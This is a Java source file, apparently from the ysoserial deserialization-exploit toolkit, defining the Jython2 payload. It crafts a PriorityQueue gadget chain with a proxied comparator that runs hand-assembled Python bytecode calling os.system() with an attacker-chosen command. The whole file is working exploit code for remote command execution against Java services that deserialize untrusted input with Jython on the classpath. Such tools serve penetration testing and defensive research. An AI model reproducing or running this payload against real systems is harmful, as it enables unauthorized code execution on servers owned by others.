package ysoserial.payloads;

import org.python.core.*;
import java.math.BigInteger;
import java.lang.reflect.Proxy;
import java.util.Comparator;
import java.util.PriorityQueue;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.util.Reflections;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

/**
 * Credits: Alvaro Munoz (@pwntester), Christian Schneider (@cschneider4711),
 * and Yorick Koster (@ykoster)
 *
 * This version of Jython2 executes a command through os.system().
 * Based on Jython1 from @pwntester & @cschneider4711
 */

@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
@Dependencies({ "org.python:jython-standalone:2.5.2" })
@Authors({ Authors.PWNTESTER, Authors.CSCHNEIDER4711, Authors.YKOSTER })
public class Jython2 extends PayloadRunner implements ObjectPayload<PriorityQueue> {

    public PriorityQueue getObject(String command) throws Exception {
		String code =
				"740000" + // 0 LOAD_GLOBAL              0 (eval)
				"640100" + // 3 LOAD_CONST               1 ("__import__('os', globals(), locals(), ['system'], 0).system('<command>')")
				"830100" + // 6 CALL_FUNCTION            1
				"01" +     // 9 POP_TOP
				"640000" + //10 LOAD_CONST               0 (None)
				"53";      //13 RETURN_VALUE
        PyObject[] consts = new PyObject[]{new PyString(""), new PyString("__import__('os', globals(), locals(), ['system'], 0).system('" + command.replace("'", "\\'") + "')")};
        String[] names = new String[]{"eval"};

        // Generating PyBytecode wrapper for our python bytecode
        PyBytecode codeobj = new PyBytecode(2, 2, 10, 64, "", consts, names, new String[]{ "", "" }, "noname", "<module>", 0, "");
        Reflections.setFieldValue(codeobj, "co_code", new BigInteger(code, 16).toByteArray());

        // Create a PyFunction Invocation handler that will call our python bytecode when intercepting any method
        PyFunction handler = new PyFunction(new PyStringMap(), null, codeobj);

        // Prepare Trigger Gadget
        Comparator comparator = (Comparator) Proxy.newProxyInstance(Comparator.class.getClassLoader(), new Class<?>[]{Comparator.class}, handler);
        PriorityQueue<Object> priorityQueue = new PriorityQueue<Object>(2, comparator);
        Object[] queue = new Object[] {1,1};
        Reflections.setFieldValue(priorityQueue, "queue", queue);
        Reflections.setFieldValue(priorityQueue, "size", 2);

        return priorityQueue;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Jython2.class, args);
    }
}